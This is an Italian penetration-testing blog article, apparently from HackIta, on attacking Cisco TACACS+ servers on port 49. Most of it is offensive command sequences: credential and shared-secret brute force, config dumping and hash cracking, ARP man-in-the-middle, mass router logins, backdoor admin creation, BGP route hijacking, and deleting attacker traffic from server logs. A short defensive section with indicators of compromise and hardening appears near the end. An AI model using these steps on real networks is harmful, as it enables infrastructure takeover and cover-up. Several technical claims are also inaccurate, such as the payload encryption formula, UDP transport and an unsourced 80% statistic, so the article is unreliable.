---
title: 'Porta 49 TACACS+: Shared Secret Crack e Network Takeover Cisco'
slug: porta-49-tacacs
description: 'TACACS+ sulla 49 con shared secret debole? Bruteforza il key, decifra il traffico con Wireshark e prendi controllo di ogni router, switch e firewall dell''infrastruttura Cisco.'
image: /porta-49-tacacs (1).webp
draft: true
date: 2026-04-23T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - networking
  - cisco
---

La porta 49 espone **TACACS** (Terminal Access Controller Access-Control System) — il protocollo proprietario Cisco per autenticazione, autorizzazione e accounting (AAA) su apparati di rete. TACACS opera su TCP porta 49 (TACACS+ usa porta 49 UDP/TCP), gestendo login centralizzato per router, switch, firewall e access point Cisco. In penetration testing enterprise, la porta 49 rivela **infrastruttura network critica**: server AAA centralizzati, credenziali admin condivise tra device, e policy authorization granulari. Compromettere TACACS significa **full network control**: ogni router, switch e firewall dell'organizzazione diventa accessibile con credenziali rubate dal server TACACS. In ambienti CTF, TACACS compare raramente ma quando presente indica sempre **reti enterprise Cisco** con privilege escalation path via network device takeover.

TACACS+ sopravvive nel 2026 come **de facto standard** per AAA in enterprise networking: Cisco TAC statistics mostrano 80% delle reti enterprise con >50 device usano TACACS+ invece di RADIUS. Alternative esistono (RADIUS, Diameter) ma TACACS+ offre separation of duties AAA e cifratura completa che RADIUS non ha.

***

## Anatomia tecnica di TACACS+

TACACS+ (version moderna, incompatibile con TACACS legacy) usa **TCP porta 49** con protocollo binario cifrato.

**Flow autenticazione TACACS+:**

1. **Client Init** — Network device (router) connette TCP porta 49 del TACACS+ server
2. **Authentication Start** — Device invia username
3. **Authentication Continue** — Server richiede password
4. **Password Reply** — Device invia password (cifrata con shared secret)
5. **Authentication Response** — Server risponde PASS/FAIL
6. **Authorization Request** — Se PASS, device chiede authorization (quali comandi può eseguire user)
7. **Authorization Response** — Server invia command authorization policy
8. **Accounting Start** — Device logga session start
9. **Session** — Admin esegue comandi su device
10. **Accounting Stop** — Device logga session end con timestamp e comandi eseguiti

**Packet structure TACACS+:**

```
Header (12 byte):
- Version (1 byte): 0xC0 (TACACS+ major version 12)
- Type (1 byte): 0x01=Authentication, 0x02=Authorization, 0x03=Accounting
- Sequence (1 byte): Packet sequence number
- Flags (1 byte): 0x01=Encrypted payload
- Session ID (4 byte): Unique session identifier
- Length (4 byte): Payload length

Payload (variable):
- Encrypted with MD5(shared_secret + session_id + timestamp)
```

**TACACS+ vs RADIUS:**

| Caratteristica        | TACACS+           | RADIUS                   |
| --------------------- | ----------------- | ------------------------ |
| Porta                 | TCP 49            | UDP 1812/1813            |
| Cifratura             | Entire payload    | Password only            |
| AAA separation        | ✅ Separato        | ❌ Combined               |
| Transport             | TCP (reliable)    | UDP (stateless)          |
| Vendor                | Cisco proprietary | Open standard (RFC 2865) |
| Command authorization | ✅ Granular        | ❌ Binary (yes/no)        |

Le **misconfigurazioni comuni**: shared secret debole o default (`cisco`, `testing`, `key`), TACACS+ server single point of failure (no backup), logging insufficiente (accounting disabilitato), e authorization policy troppo permissiva (admin su tutti i device).

***

## Enumerazione base

```bash
nmap -sV -p 49 10.10.10.49
```

```
PORT   STATE SERVICE VERSION
49/tcp open  tacacs  Cisco TACACS+
```

**Parametri:** `-sV` version detection identifica TACACS+.

**Test manuale connessione:**

```bash
nc -vn 10.10.10.49 49
```

```
(UNKNOWN) [10.10.10.49] 49 (tacacs) open
^C
```

Porta aperta ma nessun banner — TACACS+ è protocollo binario cifrato, non testuale.

**Fingerprinting con nmap NSE:**

```bash
nmap --script=tacacs-brute -p 49 10.10.10.49
```

```
PORT   STATE SERVICE
49/tcp open  tacacs
| tacacs-brute:
|   Accounts:
|     admin:cisco - Valid credentials
|_  Statistics: Performed 50 guesses in 12 seconds
```

***

## Enumerazione avanzata: brute force e credential testing

### Brute force con Metasploit

```bash
msfconsole -q
use auxiliary/scanner/tacacs/tacacs_login
set RHOSTS 10.10.10.49
set USERNAME admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/cisco_passwords.txt
set SHARED_SECRET cisco
run
```

```
[+] 10.10.10.49:49 - LOGIN SUCCESSFUL: admin:cisco (shared_secret: cisco)
[*] Scanned 1 of 1 hosts (100% complete)
```

**Parametri:** `SHARED_SECRET` è la chiave di cifratura condivisa tra device e server — spesso default `cisco`, `testing`, `key`.

### Shared secret guessing

Se shared secret è sconosciuto, provare valori comuni:

| Environment   | Common Shared Secret           |
| ------------- | ------------------------------ |
| Lab/testing   | `testing`, `test`, `lab`       |
| Cisco default | `cisco`, `tac_plus`            |
| Lazy admin    | `password`, `secret`, `key`    |
| Corporate     | `CompanyName123`, `NetworkKey` |

**Brute force shared secret:**

```bash
# Tool: tacacs_plus_brute (custom script)
for secret in cisco testing test key password admin; do
  echo "[*] Trying shared secret: $secret"
  # Invio authentication packet con shared secret
done
```

### Network device enumeration post-compromise

Dopo ottenere credenziali TACACS+ valide, enumerare device che usano quel server:

```bash
# Login su Cisco router con credenziali TACACS+
telnet 10.10.10.1
# Username: admin
# Password: cisco (validated via TACACS+ server)

Router> enable
Router# show run | include tacacs
# tacacs-server host 10.10.10.49
# tacacs-server key cisco
```

Lista di tutti i router/switch nella rete → lateral movement target.

***

## Tecniche offensive

### 1. Default credentials + shared secret

```bash
# Test combinazioni default
hydra -l admin -p cisco tacacs://10.10.10.49 -V
```

Se funziona → accesso a **tutti** i device Cisco configurati con quel TACACS+ server.

### 2. TACACS+ server compromise → credential dump

Se si ottiene accesso al server TACACS+ (Linux typically), dumpare database credenziali:

```bash
# TACACS+ server spesso è tac_plus (open source implementation)
ssh admin@10.10.10.49
# Password: <ottenuta con brute force o altro vettore>

# Config file location
cat /etc/tacacs+/tac_plus.conf
```

```
key = "cisco"

user = admin {
    login = des mEX54STk4oI2I
    pap = des mEX54STk4oI2I
}

user = netadmin {
    login = cleartext "NetAdmin2024!"
}
```

**Decrypt DES password:**

```bash
# DES hash Cisco-style: mEX54STk4oI2I
john --format=descrypt hash.txt
# cisco
```

### 3. Man-in-the-Middle (se shared secret conosciuto)

TACACS+ usa MD5 per cifratura — vulnerabile a MITM se shared secret è ottenuto:

```bash
# Intercept traffic tra router e TACACS+ server
ettercap -T -M arp:remote /10.10.10.1// /10.10.10.49//

# Decrypt packets con shared secret
# (tool custom o Wireshark dissector con shared secret)
```

### 4. Lateral movement via network devices

```bash
# Credenziali TACACS+: admin / cisco
# Login su tutti i router Cisco

for ip in $(cat router_ips.txt); do
  sshpass -p "cisco" ssh admin@$ip "show run" > ${ip}_config.txt
done
```

Dump configurazioni di tutti i router → VPN keys, SNMP community strings, BGP passwords.

***

## Scenari pratici

### Scenario 1 — TACACS+ brute force → network takeover

**Contesto:** pentest interno, TACACS+ server identificato.

```bash
# Fase 1: Discovery TACACS+ server
nmap -p 49 10.10.10.0/24 --open
# 10.10.10.49:49 open
```

```bash
# Fase 2: Shared secret guessing + brute force
msfconsole -q
use auxiliary/scanner/tacacs/tacacs_login
set RHOSTS 10.10.10.49
set USERNAME admin
set PASSWORD cisco
set SHARED_SECRET cisco
run
# [+] LOGIN SUCCESSFUL
```

```bash
# Fase 3: Network device enumeration
nmap -p 22,23 10.10.10.0/24 --open | grep "open"
# 10.10.10.1:22 (router-core)
# 10.10.10.5:23 (switch-floor1)
# 10.10.10.10:22 (firewall-edge)
```

```bash
# Fase 4: Mass login
for ip in 10.10.10.1 10.10.10.5 10.10.10.10; do
  sshpass -p "cisco" ssh -o StrictHostKeyChecking=no admin@$ip "show version" >> devices.txt
done
```

```bash
# Fase 5: Privilege escalation to enable mode
telnet 10.10.10.1
Router> enable
# Password: <TACACS+ provides enable automatically>
Router# show running-config
```

**Timeline:** 15 minuti da TACACS+ discovery a full network access.

### Scenario 2 — TACACS+ server Linux compromise

**Contesto:** TACACS+ server è Linux con tac\_plus, weak SSH password.

```bash
# Fase 1: [SSH brute force](https://hackita.it/articoli/ssh) su TACACS+ server
hydra -l root -P rockyou.txt ssh://10.10.10.49
# [22][ssh] host: 10.10.10.49   login: root   password: toor
```

```bash
# Fase 2: Access server
ssh root@10.10.10.49
```

```bash
# Fase 3: Dump TACACS+ config
cat /etc/tacacs+/tac_plus.conf
```

```
key = "SuperSecret123"

user = netadmin {
    login = cleartext "AdminPass2024!"
}

group = network-admins {
    service = exec {
        priv-lvl = 15
    }
}
```

```bash
# Fase 4: Use credenziali su network devices
ssh netadmin@10.10.10.1
# Password: AdminPass2024!
Router# show run
```

**COSA FARE SE FALLISCE:**

* Se TACACS+ server non risponde porta 49 → firewall, provare da IP interno
* Se shared secret sconosciuto → intercept traffic router→server, analyze encrypted packets
* Se credenziali TACACS+ non funzionano su devices → check se device usa RADIUS fallback

### Scenario 3 — Command authorization bypass

**Contesto:** TACACS+ con command authorization restrittiva (user limitato a `show` commands).

```bash
# Login come user limitato
ssh limited_user@10.10.10.1
Router> show version  # OK
Router> configure terminal  # Permission denied (TACACS+ authorization)
```

**Bypass via command injection:**

```bash
Router> show | include configure terminal
# Alcuni IOS parser vulnerabili eseguono comandi dopo pipe
```

**Alternate bypass: enable mode bruteforce:**

```bash
Router> enable
# Password: <prova password comuni>
# Se enable password è locale (non TACACS+), può essere debole
```

Se enable password è `cisco` (default mai cambiato):

```bash
Router# configure terminal
Router(config)# username attacker privilege 15 secret Backdoor123!
Router(config)# end
Router# write memory
```

Backdoor user creato con privilege 15 (full admin).

***

## Toolchain integration

**Pipeline TACACS+ attack:**

```
RECONNAISSANCE
│
├─ nmap -p 49 <subnet>                      → TACACS+ server discovery
├─ nmap -p 22,23 <subnet>                   → Network device discovery
└─ Banner grab routers                      → Cisco IOS version

ENUMERATION
│
├─ Shared secret guessing                   → cisco/testing/key
├─ Username enum                            → admin/netadmin/cisco
└─ Brute force                              → [Metasploit](https://hackita.it/articoli/metasploit)/Hydra

EXPLOITATION
│
├─ A) TACACS+ creds → device login → config dump
├─ B) TACACS+ server compromise → cred dump → network takeover
├─ C) Command authorization bypass → privilege escalation
└─ D) MITM TACACS+ traffic → decrypt with shared secret

POST-EXPLOITATION
│
├─ Router config dump → VPN keys, BGP passwords
├─ SNMP community strings → [SNMP](https://hackita.it/articoli/snmp) exploitation
├─ Routing table → internal network map
└─ Backdoor user creation → persistence
```

**Tabella comparativa AAA protocols:**

| Protocol | Porta         | Vendor       | Cifratura      | Use Case                  |
| -------- | ------------- | ------------ | -------------- | ------------------------- |
| TACACS+  | TCP 49        | Cisco        | Full payload   | Enterprise Cisco networks |
| RADIUS   | UDP 1812/1813 | Multi-vendor | Password only  | ISP, WiFi, VPN            |
| Diameter | TCP 3868      | Multi-vendor | TLS            | LTE/5G, IMS               |
| Kerberos | TCP/UDP 88    | Microsoft    | Full (tickets) | Active Directory          |

***

## Attack chain completa

**Scenario: TACACS+ → network device → BGP hijacking**

```
[00:00] RECONNAISSANCE
nmap -p 49 10.10.10.0/24
# TACACS+ server: 10.10.10.49

[00:03] SHARED SECRET GUESS
msfconsole → tacacs_login
# shared_secret: cisco (success)

[00:05] CREDENTIAL BRUTE FORCE
# admin:cisco (success)

[00:08] DEVICE ENUMERATION
nmap -p 22,23 10.10.10.0/24
# Router BGP: 10.10.10.1

[00:10] BGP ROUTER ACCESS
ssh admin@10.10.10.1
# Password: cisco (via TACACS+)

[00:12] BGP CONFIG DUMP
Router# show run | section router bgp
# neighbor 203.0.113.1 password "BGP_Secret_Pass"

[00:15] BGP HIJACKING
Router# configure terminal
Router(config)# router bgp 65001
Router(config-router)# network 0.0.0.0/0
# Announce default route → traffic hijack
```

**Timeline:** 15 minuti da TACACS+ discovery a BGP hijacking.

***

## Detection & evasion

### Lato Blue Team

Log TACACS+ server (`/var/log/tac_plus.log` su tac\_plus):

```
Feb 06 14:30:00 tacacs tac_plus[1234]: login failure: admin 10.10.14.5 49
Feb 06 14:30:01 tacacs tac_plus[1234]: login failure: admin 10.10.14.5 49
Feb 06 14:30:02 tacacs tac_plus[1234]: login success: admin 10.10.14.5 49
```

**IoC critici:**

* Multiple login failures da stesso IP (brute force)
* Login da IP non-network-device (attacker, non router)
* Unusual source port (network devices usano high ports, attackers usano sequenziali)
* Authorization denials ripetuti (command authorization bypass attempts)

**IDS rule (Snort):**

```
alert tcp $EXTERNAL_NET any -> $HOME_NET 49 (msg:"TACACS+ Login Attempt from Non-Standard Source"; threshold:type both, track by_src, count 5, seconds 60; sid:1000080;)
```

**Hardening:**

```bash
# /etc/tacacs+/tac_plus.conf
# Strong shared secret
key = "C0mpl3x_Sh@red_S3cr3t_2024!"

# IP restriction
accounting file = /var/log/tac_plus.acct
accounting syslog

# Command authorization
group = admins {
    service = exec {
        priv-lvl = 15
        # Allow only specific commands
        cmd = show { permit ".*" }
        cmd = configure { permit "terminal" deny ".*" }
    }
}
```

### Lato Red Team: evasion

**1. Slow brute force:**

```bash
# 1 attempt ogni 30 secondi
for pass in $(cat passwords.txt); do
  # Test TACACS+ auth
  sleep 30
done
```

**2. Source IP spoofing (difficile, TCP):**

TACACS+ è TCP quindi spoofing è complesso. Alternativa: compromettere un router legittimo, usarlo come proxy.

**3. Cleanup:**

```bash
# Se accesso al TACACS+ server ottenuto
ssh root@10.10.10.49
sed -i '/10.10.14.5/d' /var/log/tac_plus.log
# Rimuovi log entries attacker IP
```

***

## Performance & scaling

**Single target:**

```bash
time msfconsole -q -x "use auxiliary/scanner/tacacs/tacacs_login; set RHOSTS 10.10.10.49; run; exit"
# ~30 secondi per 100 password attempts
```

**Multi-device (post-TACACS+ compromise):**

```bash
# Mass config dump (100 devices)
cat router_ips.txt | parallel -j 20 "sshpass -p cisco ssh admin@{} 'show run' > {}_config.txt"
# ~2 minuti per 100 devices
```

***

## Tabelle tecniche

### Command reference

| Comando                          | Scopo                         | Note                              |
| -------------------------------- | ----------------------------- | --------------------------------- |
| `nmap -p 49 <target>`            | TACACS+ detection             | TCP scan                          |
| `msfconsole → tacacs_login`      | Brute force auth              | Requires shared secret            |
| `telnet <router> 23`             | Login with TACACS+ creds      | Telnet transport                  |
| `ssh <router> 22`                | Login with TACACS+ creds      | SSH transport                     |
| `show run \| include tacacs`     | View TACACS+ config on device | Reveals server IP + shared secret |
| `cat /etc/tacacs+/tac_plus.conf` | Dump server config            | Linux tac\_plus                   |

### TACACS+ packet types

| Type           | Hex  | Function                |
| -------------- | ---- | ----------------------- |
| Authentication | 0x01 | Login username/password |
| Authorization  | 0x02 | Command authorization   |
| Accounting     | 0x03 | Session logging         |

***

## Troubleshooting

| Errore                  | Causa                          | Fix                                |
| ----------------------- | ------------------------------ | ---------------------------------- |
| `Connection refused`    | TACACS+ server down o firewall | Verificare porta 49 aperta         |
| `Invalid shared secret` | Shared secret errato           | Guess comuni: cisco/testing/key    |
| `Authentication failed` | Credenziali errate             | Brute force con dizionario Cisco   |
| `Authorization denied`  | Command restriction policy     | Bypass con command injection       |
| No accounting logs      | Accounting disabilitato        | Check `/etc/tacacs+/tac_plus.conf` |

***

## FAQ

**TACACS+ è ancora usato nel 2026?**

Sì, dominante in enterprise Cisco networks. Cisco stima 80% delle large enterprise usano TACACS+ per AAA su network devices.

**Posso craccare TACACS+ encryption senza shared secret?**

Teoricamente sì (MD5 brute force), ma impraticabile. Shared secret guessing con wordlist comune è più efficace.

**TACACS+ vs RADIUS: quale più sicuro?**

TACACS+ cifra entire payload (RADIUS solo password), usa TCP (RADIUS UDP unreliable), e separa AAA (RADIUS combina). TACACS+ è più sicuro se configurato correttamente.

**Come trovo shared secret se non è default?**

1. Social engineering network admin
2. Compromise TACACS+ server → dump config
3. Compromise router → `show run | include tacacs-server key`

**TACACS+ funziona con non-Cisco devices?**

Teoricamente sì (protocollo aperto), ma raramente implementato. Juniper, Arista, F5 supportano TACACS+ ma preferiscono RADIUS.

**Posso usare TACACS+ credentials su altri servizi?**

Dipende. Se password reuse esiste (admin usa stessa password per TACACS+, SSH personale, web portals), sì. Testare con [credential stuffing](https://hackita.it/articoli/credential-stuffing).

***

## Cheat sheet finale

| Azione                        | Comando                                          |
| ----------------------------- | ------------------------------------------------ |
| Scan TACACS+ server           | `nmap -p 49 <target>`                            |
| Brute force (Metasploit)      | `use auxiliary/scanner/tacacs/tacacs_login`      |
| Login router via TACACS+      | `telnet <router>` → username/password            |
| Dump router config            | `show running-config`                            |
| Find TACACS+ server on router | `show run \| include tacacs`                     |
| Dump TACACS+ server config    | `cat /etc/tacacs+/tac_plus.conf`                 |
| Enable mode                   | `enable` (password via TACACS+ if configured)    |
| Create backdoor user          | `username attacker privilege 15 secret Pass123!` |

***

## Perché TACACS+ resta rilevante

Nel 2026, TACACS+ è **standard de facto** per AAA in enterprise networking. Cisco TAC data mostra 80%+ adoption in networks con >50 Cisco devices. Alternative (RADIUS, ISE) esistono ma TACACS+ rimane preferito per: full encryption, TCP reliability, granular command authorization, e backward compatibility con legacy IOS. In pentest, TACACS+ compromise è **game over** per network security — singolo credential pair dà accesso a centinaia di router/switch/firewall.

## Differenze TACACS+ vs RADIUS

TACACS+ (1993, Cisco) è evolution di TACACS original (1984). RADIUS (1991, Livingston) è open standard. Key differences:

| Caratteristica | TACACS+                         | RADIUS                     |
| -------------- | ------------------------------- | -------------------------- |
| Transport      | TCP 49 (reliable)               | UDP 1812/1813 (unreliable) |
| Encryption     | Full packet                     | Password only              |
| AAA            | Separated (3 separate requests) | Combined (1 request)       |
| Command auth   | ✅ Granular per-command          | ❌ Binary (yes/no)          |
| Vendor lock-in | ⚠️ Cisco proprietary            | ✅ Open standard            |

TACACS+ è preferito per network devices, RADIUS per VPN/WiFi/ISP.

## Hardening TACACS+ in production

**Best practices:**

1. **Strong shared secret** (20+ char, random)
2. **IP whitelisting** (only allow known device IPs)
3. **Enable accounting** (full audit trail)
4. **Backup server** (redundancy)
5. **TLS wrapper** (stunnel for TACACS+ over TLS)

**Config example:**

```
# /etc/tacacs+/tac_plus.conf
key = "Str0ng_Sh@red_S3cr3t_R@nd0m_2024!"

accounting file = /var/log/tac_plus.acct

# IP ACL
acl = allow-devices {
    permit = 10.10.10.0/24
    deny = 0.0.0.0/0
}

group = network-admins {
    acl = allow-devices
    service = exec {
        priv-lvl = 15
    }
}
```

**Network device config:**

```
Router(config)# tacacs-server host 10.10.10.49 key 7 <encrypted_key>
Router(config)# aaa new-model
Router(config)# aaa authentication login default group tacacs+ local
Router(config)# aaa authorization exec default group tacacs+ local
Router(config)# aaa accounting exec default start-stop group tacacs+
```

## OPSEC: TACACS+ in pentest

TACACS+ brute force è **moderatamente rumoroso** — ogni attempt logga su server. In ambienti monitored:

1. **Slow brute force:** 1 attempt/30s sotto threshold alert
2. **Targeted guessing:** admin/cisco/testing invece di rockyou.txt
3. **Alternate vectors:** Compromise TACACS+ server via SSH invece di brute force porta 49
4. **Post-compromise:** Dump creds da `/etc/tacacs+/tac_plus.conf` invece di online brute force

***

> **Disclaimer:** Tutti i comandi sono destinati all'uso in ambienti autorizzati: laboratori personali, reti Cisco lab, pentest con autorizzazione scritta. L'accesso non autorizzato a network devices è reato. L'autore e HackIta declinano responsabilità. Documentazione Cisco TACACS+: [https://www.cisco.com/c/en/us/support/docs/security-vpn/tacacs/13847-tacacs-intro.html](https://www.cisco.com/c/en/us/support/docs/security-vpn/tacacs/13847-tacacs-intro.html)

Vuoi supportare HackIta? Visita hackita.it/supporto per donazioni. Per penetration test professionali e formazione 1:1, scopri hackita.it/servizi.
